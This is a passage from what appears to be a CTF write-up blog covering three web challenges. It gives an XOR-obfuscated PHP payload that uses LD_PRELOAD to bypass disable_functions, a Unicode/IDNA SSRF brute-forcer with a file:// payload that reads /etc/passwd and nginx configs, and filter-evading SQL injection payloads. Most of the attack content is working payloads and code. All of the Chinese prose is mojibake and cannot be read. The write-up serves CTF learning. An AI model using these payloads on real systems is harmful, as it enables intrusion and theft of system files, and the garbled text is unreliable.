<p><img src="/images/IUW8YX16KKFF6HS.png" srcset="/img/loading.gif" lazyload><br>é€šè¿‡phpinfo()é¡µé¢å¯çŸ¥<br><img src="/images/I1AISR2SJBF6ZWJ4.png" srcset="/img/loading.gif" lazyload><br>åœ¨phpinfo()é¡µé¢å¯ä»¥å‘ç°ç¦ç”¨äº†éå¸¸å¤šçš„å‡½æ•°ï¼Œå…¶ä¸­åŒ…æ‹¬systemã€execã€shell_execç­‰å…³é”®æ‰§è¡Œå‡½æ•°<br>æœ‰shelläº†å°±è¿ä¸‹èšå‰‘<br>è¿æ¥å‘ç°æ ¹ç›®å½•æœ‰flagï¼Œä½†æ˜¯ä¸ºç©ºï¼Œè¿˜æœ‰ä¸€ä¸ªreadflagæ–‡ä»¶<br>è¿™é‡Œå¯ä»¥å‘ç°readflagè¿™ä¸ªæ–‡ä»¶ä½†æ˜¯å¹¶æ²¡æœ‰æ‰§è¡Œæƒé™ï¼Œæ‰€ä»¥å¾—ç»•è¿‡disable_function<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/192052.html">å·§ç”¨LD_PRELOADçªç ´disable_functions</a><br>é€šè¿‡æ–‡ç« å¯ä»¥äº†è§£åˆ°<br>å¯¼è‡´ webshell ä¸èƒ½æ‰§è¡Œå‘½ä»¤çš„åŸå› å¤§æ¦‚æœ‰ä¸‰ç±»ï¼šä¸€æ˜¯ php.ini ä¸­ç”¨ disable_functions æŒ‡ç¤ºå™¨ç¦ç”¨äº† system()ã€exec() ç­‰ç­‰è¿™ç±»å‘½ä»¤æ‰§è¡Œçš„ç›¸å…³å‡½æ•°ï¼›äºŒæ˜¯ web è¿›ç¨‹è¿è¡Œåœ¨ rbash è¿™ç±»å—é™ shell ç¯å¢ƒä¸­ï¼›ä¸‰æ˜¯ WAF æ‹¦åŠ«ã€‚è‹¥æ˜¯ä¸€åˆ™æ— æ³•æ‰§è¡Œä»»ä½•å‘½ä»¤ï¼Œè‹¥æ˜¯äºŒã€ä¸‰åˆ™å¯ä»¥æ‰§è¡Œå°‘é‡å‘½ä»¤ã€‚</p>
<p>æœ‰å››ç§ç»•è¿‡ disable_functions çš„æ‰‹æ³•ï¼šç¬¬ä¸€ç§ï¼Œæ”»å‡»åç«¯ç»„ä»¶ï¼Œå¯»æ‰¾å­˜åœ¨å‘½ä»¤æ³¨å…¥çš„ã€web åº”ç”¨å¸¸ç”¨çš„åç«¯ç»„ä»¶ï¼Œå¦‚ï¼ŒImageMagick çš„é­”å›¾æ¼æ´ã€bash çš„ç ´å£³æ¼æ´ï¼›ç¬¬äºŒç§ï¼Œå¯»æ‰¾æœªç¦ç”¨çš„æ¼ç½‘å‡½æ•°ï¼Œå¸¸è§çš„æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°æœ‰ system()ã€exec()ã€shell_exec()ã€passthru()ï¼Œååƒ»çš„ popen()ã€proc_open()ã€pcntl_exec()ï¼Œé€ä¸€å°è¯•ï¼Œæˆ–è®¸æœ‰æ¼ç½‘ä¹‹é±¼ï¼›ç¬¬ä¸‰ç§ï¼Œmod_cgi æ¨¡å¼ï¼Œå°è¯•ä¿®æ”¹ .htaccessï¼Œè°ƒæ•´è¯·æ±‚è®¿é—®è·¯ç”±ï¼Œç»•è¿‡ php.ini ä¸­çš„ä»»ä½•é™åˆ¶ï¼›ç¬¬å››ç§ï¼Œåˆ©ç”¨ç¯å¢ƒå˜é‡ LD_PRELOAD åŠ«æŒç³»ç»Ÿå‡½æ•°ï¼Œè®©å¤–éƒ¨ç¨‹åºåŠ è½½æ¶æ„ *.soï¼Œè¾¾åˆ°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æ•ˆæœã€‚</p>
<p>ä¸‹è½½åšä¸»æ•´ç†çš„æºç <br>ä¸Šä¼ åˆ°èšå‰‘çš„var&#x2F;tmpç›®å½•ä¸‹<br><img src="/images/IDZ3WZLUP4E34ZIGIN.png" srcset="/img/loading.gif" lazyload><br>æˆ‘ä»¬éœ€è¦ä¼ å…¥ä¸‰ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°cmdä¸ºæ‰§è¡Œçš„å‘½ä»¤ï¼Œç¬¬äºŒä¸ªå‚æ•°outpathä¸ºè¾“å…¥å‡ºæ–‡ä»¶ä½ç½®ï¼Œç¬¬ä¸‰ä¸ªsopathå‚æ•°ä¸ºä¸Šä¼ çš„soæ–‡ä»¶æ‰€åœ¨ä½ç½®<br>payload:</p>
<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sas">?code=$&#123;<span class="hljs-title function_">%fe</span><span class="hljs-title function_">%fe</span><span class="hljs-title function_">%fe</span><span class="hljs-title function_">%fe</span>^<span class="hljs-title function_">%a1</span><span class="hljs-title function_">%b9</span><span class="hljs-title function_">%bb</span><span class="hljs-title function_">%aa</span>&#125;[_]($&#123;<span class="hljs-title function_">%fe</span><span class="hljs-title function_">%fe</span><span class="hljs-title function_">%fe</span><span class="hljs-title function_">%fe</span>^<span class="hljs-title function_">%a1</span><span class="hljs-title function_">%b9</span><span class="hljs-title function_">%bb</span><span class="hljs-title function_">%aa</span>&#125;[__]);<span class="hljs-variable">&amp;_</span>=assert<span class="hljs-variable">&amp;__</span>=include(%27/var/tmp/bypass_disablefunc.php%27)<span class="hljs-variable">&amp;cmd</span>=/readflag<span class="hljs-variable">&amp;outpath</span>=/tmp/tmpfile<span class="hljs-variable">&amp;sopath</span>=/var/tmp/bypass_disablefunc_x64.so<br>è¿™é‡Œä½¿ç”¨çš„æ˜¯å¼‚æˆ–ç»•è¿‡%##ä¸º16è¿›åˆ¶æ ¼å¼,å¼‚æˆ–è½¬åŒ–ä¸ºä¸‹<br>?code=$&#123;_GET&#125;[_]($&#123;_GET&#125;[__]);<span class="hljs-variable">&amp;_</span>=assert<span class="hljs-variable">&amp;__</span>=include(%27/var/tmp/bypass_disablefunc.php%27)<span class="hljs-variable">&amp;cmd</span>=/readflag<span class="hljs-variable">&amp;outpath</span>=/tmp/tmpfile<span class="hljs-variable">&amp;sopath</span>=/var/tmp/bypass_disablefunc_x64.so<br>//å…¶ä¸­$&#123;_GET&#125;[_]ä¸$_GET[_]ç”¨æ³•ç±»ä¼¼ï¼Œä½†æœ¬é¢˜ç¬¬äºŒç§æ–¹æ³•è¯•äº†æ²¡é€šè¿‡ï¼Œå¯èƒ½æ˜¯å› ä¸ºç½‘ç»œé—®é¢˜ï¼Œæ²¡æœ‰æµ‹è¯•å¾ˆå¤šæ¬¡ï¼Œåå…­è¿›åˆ¶æ•°å¯¹åº”çš„å­—ç¬¦å°½é‡ä¸ºä¸å¯è§å­—ç¬¦ï¼Œä¸ç„¶ä¼šè¢«æµè§ˆå™¨ç¼–è¯‘ï¼Œå¯¼è‡´å¤±è´¥ã€‚ã€‚ã€‚<br></code></pre></td></tr></table></figure>
<p><img src="/images/FYRDD8A02HBUVNJJFWD.png" srcset="/img/loading.gif" lazyload><br>è‡³æ­¤ä»¥å¤§åŠŸå‘Šæˆ</p>
<h2 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h2><p><img src="/images/NUADL8I15TFAOGUYBJE0V.png" srcset="/img/loading.gif" lazyload><br>å°†é¢˜ç›®ç»™çš„ä»£ç æ•´ç†ä¸€ä¸‹</p>
<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@app</span>.<span class="hljs-built_in">route</span>(<span class="hljs-string">&#x27;/getUrl&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>])<br>def <span class="hljs-built_in">getUrl</span>():<br>    url = request.args.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;url&quot;</span>)<br>    host = parse.<span class="hljs-built_in">urlparse</span>(url).hostname #è·å–åŸŸåip ä¾‹ï¼šwww.xxxx.com<br>    if host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        return <span class="hljs-string">&quot;æˆ‘æ‰Œ your problem? 111&quot;</span><br>    parts = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">urlsplit</span>(url)) <br>    host = parts[<span class="hljs-number">1</span>]<br>    if host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        return <span class="hljs-string">&quot;æˆ‘æ‰Œ your problem? 222 &quot;</span> + host<br>    newhost = []<br>    for h in host.<span class="hljs-built_in">split</span>(<span class="hljs-string">&#x27;.&#x27;</span>):<br>        newhost.<span class="hljs-built_in">append</span>(h.<span class="hljs-built_in">encode</span>(<span class="hljs-string">&#x27;idna&#x27;</span>).<span class="hljs-built_in">decode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    parts[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-built_in">join</span>(newhost)<br>    #å»æ‰ url ä¸­çš„ç©ºæ ¼<br>    finalUrl = <span class="hljs-built_in">urlunsplit</span>(parts).<span class="hljs-built_in">split</span>(<span class="hljs-string">&#x27; &#x27;</span>)[<span class="hljs-number">0</span>]<br>    host = parse.<span class="hljs-built_in">urlparse</span>(finalUrl).hostname<br>    if host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        return urllib.request.<span class="hljs-built_in">urlopen</span>(finalUrl).<span class="hljs-built_in">read</span>()<br>    <span class="hljs-attribute">else</span>:<br>        return <span class="hljs-string">&quot;æˆ‘æ‰Œ your problem? 333&quot;</span><br></code></pre></td></tr></table></figure>

<p>è¿™é“é¢˜ç”¨çš„æ˜¯blackhatè®®é¢˜ä¹‹ä¸€HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization<br>nginxé…ç½®æ–‡ä»¶è·¯å¾„ black hatä¸€ä¸ªè®®é¢˜ ä»»æ„è¯»å–æ–‡ä»¶<br><a target="_blank" rel="noopener" href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf">åŸé“¾æ¥åœ¨è¿™</a><br>å…ˆæ¥åˆ†æä»£ç <br>å¯¹å‡ ä¸ªå‡½æ•°è¿›è¡Œè§£é‡Š<br>urlsplit(url)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">url = <span class="hljs-string">&quot;https://username:password@www.baidu.com:80/index.html;parameters?name=tom#example&quot;</span><br><br><span class="hljs-built_in">print</span>(urlsplit(url))<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">SplitResult(</span><br><span class="hljs-string">    scheme=&#x27;https&#x27;, </span><br><span class="hljs-string">    netloc=&#x27;username:password@www.baidu.com:80&#x27;, </span><br><span class="hljs-string">    path=&#x27;/index.html;parameters&#x27;, </span><br><span class="hljs-string">    query=&#x27;name=tom&#x27;, </span><br><span class="hljs-string">    fragment=&#x27;example&#x27;)</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> host<span class="hljs-selector-class">.split</span>(<span class="hljs-string">&#x27;.&#x27;</span>):<br>        newhost<span class="hljs-selector-class">.append</span>(h<span class="hljs-selector-class">.encode</span>(<span class="hljs-string">&#x27;idna&#x27;</span>)<span class="hljs-selector-class">.decode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br></code></pre></td></tr></table></figure>
<p>å¯¹å­—ç¬¦ä¸² host è¿›è¡Œäº†æ‹†åˆ†ï¼ˆsplitï¼‰æ“ä½œï¼Œç„¶åå¯¹æ¯ä¸ªåˆ†å‰²åçš„å­å­—ç¬¦ä¸²è¿›è¡Œäº†IDNAç¼–ç å’ŒUTF-8è§£ç ï¼Œæœ€ç»ˆå°†ç»“æœæ·»åŠ åˆ°åä¸º newhost çš„åˆ—è¡¨ä¸­ã€‚</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">return urllib<span class="hljs-selector-class">.request</span><span class="hljs-selector-class">.urlopen</span>(finalUrl)<span class="hljs-selector-class">.read</span>()<br></code></pre></td></tr></table></figure>
<p>ä½¿ç”¨äº† urllib.request.urlopen å‡½æ•°æ¥æ‰“å¼€æŒ‡å®šçš„URLï¼ˆfinalUrlï¼‰ï¼Œå¹¶è°ƒç”¨ read() æ–¹æ³•è¯»å–è¯¥URLè¿”å›çš„æ•°æ®ã€‚</p>
<p>æ”¹ä¸€ä¸‹ä»£ç ï¼Œæ•´ä½“è¿è¡Œä¸€ä¸‹</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> urllib import parse<br><span class="hljs-keyword">from</span> urllib.parse import urlsplit, urlparse, urlunsplit<br><br><span class="hljs-comment">#@app.route(&#x27;/getUrl&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><br>    # url = request.args.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;url&quot;</span>)<br>url = <span class="hljs-string">&quot;http://suctf.cX&quot;</span><br>host = parse.urlparse(url).hostname #è·å–åŸŸåipä¾‹ï¼šwww.xxxx.com<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;host1= &#x27;</span> +host)<br><span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br> <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;æˆ‘æ‰Œ your problem? 111&quot;</span>)<br>parts = list(urlsplit(url))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;parts = &#x27;</span>,parts)<br>host = parts[1]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;host2= &#x27;</span> +host)<br><span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;æˆ‘æ‰Œ your problem? 222&quot;</span>)<br>newhost = []<br><span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> host.split(<span class="hljs-string">&#x27;.&#x27;</span>):<br>    newhost.append(h.encode(<span class="hljs-string">&#x27;idna&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>parts[1] = <span class="hljs-string">&#x27;.&#x27;</span>.join(newhost)<br><span class="hljs-comment">#å»æ‰ url ä¸­çš„ç©ºæ ¼</span><br>finalUrl = urlunsplit(parts).split(<span class="hljs-string">&#x27; &#x27;</span>)[0]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;finalUrl = &#x27;</span> + finalUrl)<br>host = parse.urlparse(finalUrl).hostname<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;host3= &#x27;</span> +host)<br><span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;yes&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;æˆ‘æ‰Œ your problem? 444&quot;</span>)<br><br><br><span class="hljs-comment">#host1= suctf.cx</span><br><span class="hljs-comment">#parts =  [&#x27;http&#x27;, &#x27;suctf.cX&#x27;, &#x27;&#x27;, &#x27;&#x27;, &#x27;&#x27;]</span><br><span class="hljs-comment">#host2= suctf.cX</span><br><span class="hljs-comment">#finalUrl = http://suctf.cX</span><br><span class="hljs-comment">#host3= suctf.cx</span><br><span class="hljs-comment">#æˆ‘æ‰Œ your problem? 444</span><br></code></pre></td></tr></table></figure>


<p>ä»ä»£ç ä¸Šçœ‹ï¼Œæˆ‘ä»¬éœ€è¦æäº¤ä¸€ä¸ªurlï¼Œç”¨æ¥è¯»å–æœåŠ¡å™¨æ–‡ä»¶<br>éœ€è¦ç»•è¿‡å‰ä¸¤ä¸ªifï¼Œè¿›å…¥ç¬¬ä¸‰ä¸ªifæ¥ä½¿ç”¨å‡½æ•°<br>è€Œä¸‰ä¸ªifä¸­åˆ¤æ–­æ¡ä»¶éƒ½æ˜¯ç›¸åŒçš„ï¼Œä¸è¿‡åœ¨æ­¤ä¹‹å‰çš„hostæ„é€ å´æ˜¯ä¸åŒçš„ï¼Œè¿™ä¹Ÿæ˜¯blackhatè¯¥è®®é¢˜ä¸­æƒ³è¦è¯´æ˜çš„ä¸€ç‚¹<br>å½“URL ä¸­å‡ºç°ä¸€äº›ç‰¹æ®Šå­—ç¬¦çš„æ—¶å€™ï¼Œè¾“å‡ºçš„ç»“æœå¯èƒ½ä¸åœ¨é¢„æœŸ<br>è¿™é‡Œéœ€è¦æŒ‰ç…§getUrlå‡½æ•°å†™å‡ºçˆ†ç ´è„šæœ¬å³å¯å¾—åˆ°æ„é€ è¯­å¥</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse,urlunsplit,urlsplit<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_unicode</span>():<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">65536</span>):<br>        uni=<span class="hljs-built_in">chr</span>(x)<br>        url=<span class="hljs-string">&quot;http://suctf.c&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(uni)<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> getUrl(url):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;str: &quot;</span>+uni+<span class="hljs-string">&#x27; unicode: \\u&#x27;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(x))[<span class="hljs-number">2</span>:])<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getUrl</span>(<span class="hljs-params">url</span>):<br>    url=url<br>    host=parse.urlparse(url).hostname<br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    parts=<span class="hljs-built_in">list</span>(urlsplit(url))<br>    host=parts[<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    newhost=[]<br>    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> host.split(<span class="hljs-string">&#x27;.&#x27;</span>):<br>        newhost.append(h.encode(<span class="hljs-string">&#x27;idna&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    parts[<span class="hljs-number">1</span>]=<span class="hljs-string">&#x27;.&#x27;</span>.join(newhost)<br>    finalUrl=urlunsplit(parts).split(<span class="hljs-string">&#x27; &#x27;</span>)[<span class="hljs-number">0</span>]<br>    host=parse.urlparse(finalUrl).hostname<br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br> <br> <br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    get_unicode()<br><br></code></pre></td></tr></table></figure>
<p><img src="/images/I1L8OCMS423Q6WG591.png" srcset="/img/loading.gif" lazyload></p>
<p>æˆ‘ä»¬åªéœ€è¦è®©å…¶ä¸­çš„ä¸€ä¸ªå»è¯»å–æ–‡ä»¶å³å¯ï¼Œéœ€è¦urlç¼–ç ä¸€ä¸‹<br>å…ˆè¯»ä¸€ä¸‹etc&#x2F;passwd<br>payload</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/getUrl?url=file:/</span><span class="hljs-regexp">/suctf.c%E2%84%82/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br></code></pre></td></tr></table></figure>
<p><img src="/images/AZEKDNX7SKH3FWH78.png" srcset="/img/loading.gif" lazyload><br>éƒ¨åˆ†nginxçš„é…ç½®æ–‡ä»¶æ‰€åœ¨ä½ç½®</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">é…ç½®æ–‡ä»¶ï¼š <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>conf/nginx.conf<br>é…ç½®æ–‡ä»¶å­˜æ”¾ç›®å½•ï¼š<span class="hljs-regexp">/etc/</span>nginx<br>ä¸»é…ç½®æ–‡ä»¶ï¼š<span class="hljs-regexp">/etc/</span>nginx<span class="hljs-regexp">/conf/</span>nginx.conf<br>ç®¡ç†è„šæœ¬ï¼š<span class="hljs-regexp">/usr/</span>lib64<span class="hljs-regexp">/systemd/</span>system/nginx.service<br>æ¨¡å—ï¼š<span class="hljs-regexp">/usr/</span>lisb64<span class="hljs-regexp">/nginx/m</span>odules<br>åº”ç”¨ç¨‹åºï¼š<span class="hljs-regexp">/usr/</span>sbin/nginx<br>ç¨‹åºé»˜è®¤å­˜æ”¾ä½ç½®ï¼š<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/nginx/</span>html<br>æ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š<span class="hljs-regexp">/var/</span>log/nginx<br></code></pre></td></tr></table></figure>
<p>æŒ¨ä¸ªè¯»è¯»è¯•è¯•<br>åœ¨é…ç½®æ–‡ä»¶ä¸­æˆ‘ä»¬å‘ç°<br><img src="/images/JEBYS4JSYT3P6T3.png" srcset="/img/loading.gif" lazyload><br>è¯»å–<br><img src="/images/RENLJ0UVWDRW3HCA4.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><p>ç™»å½•é¡µé¢ï¼Œæœ‰æ³¨å†Œå…ˆæ³¨å†Œ<br>è¿™é‡Œadminè¢«æ³¨å†Œäº†ï¼Œæ³¨å†Œä¸€ä¸ªadmin1ï¼Œç™»å½•<br><img src="/images/EIMTIHG6GCW38WPEIR.png" srcset="/img/loading.gif" lazyload><br>ç–‘ä¼¼æ³¨å…¥ç‚¹ï¼Œä¸‡èƒ½é’¥åŒ™æµ‹æµ‹<br><img src="/images/JVEITI0I8S3UWTV.png" srcset="/img/loading.gif" lazyload><br>å­˜åœ¨è¿‡æ»¤ï¼Œå†æµ‹æµ‹<br>ä¸€ç•ªæµ‹è¯•ä»¥åï¼Œå‘ç°è¿‡æ»¤äº†or,#,â€“+å’Œç©ºæ ¼</p>
<ul>
<li><p>ç©ºæ ¼è¢«è¿‡æ»¤<br>å¯ä»¥ç”¨&#x2F;**&#x2F;ä»£æ›¿ç©ºæ ¼</p>
</li>
<li><p>æ³¨é‡Šç¬¦è¢«è¿‡æ»¤<br>å°†åé¢çš„å•å¼•å·é—­åˆå³å¯</p>
</li>
<li><p>orè¢«è¿‡æ»¤<br>å¯¼è‡´ order by ã€information_schemaéƒ½ä¸èƒ½ç”¨ã€‚<br>äºæ˜¯æŸ¥è¡¨åå¯ä»¥ä½¿ç”¨select group_concat(table_name) from mysql.innodb_table_stats where database_name&#x3D;database()</p>
</li>
</ul>
<p>å…ˆåˆ¤æ–­åˆ—æ•°<br>å› ä¸ºorè¢«ç¦ order byæ— æ³•ç”¨ï¼Œæ‰€ä»¥ç”¨group by ï¼Œä¸€æ ·çš„æ•ˆæœ<br>payload</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">group</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">by</span><span class="hljs-comment">/**/</span><span class="hljs-number">23</span>,<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/80730O6C28XTPBO8R9.png" srcset="/img/loading.gif" lazyload><br>åˆ¤æ–­ä¸º22åˆ—<br>å›æ˜¾ä½</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;union/**/select/**/<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span>&#x27;<br></code></pre></td></tr></table></figure>
<p>å›æ˜¾ä½ä¸º2ï¼Œ3</p>
<p>çˆ†æ•°æ®åº“</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;/**/union/**/select/**/<span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span>&#x27;<br></code></pre></td></tr></table></figure>
<p><img src="/images/7P3H0XHID45SU1M592.png" srcset="/img/loading.gif" lazyload></p>
<p>çˆ†è¡¨</p>
